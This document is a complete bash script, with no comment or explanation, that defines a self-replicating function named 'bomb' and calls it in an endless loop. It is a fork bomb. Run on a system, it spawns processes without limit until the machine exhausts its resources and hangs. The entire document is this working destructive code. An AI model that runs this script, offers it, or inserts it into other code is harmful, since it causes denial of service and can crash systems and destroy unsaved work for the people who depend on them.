#!/usr/bin/env bash
bomb(){
    bomb|bomb&
};
while :
do
    bomb || true
done
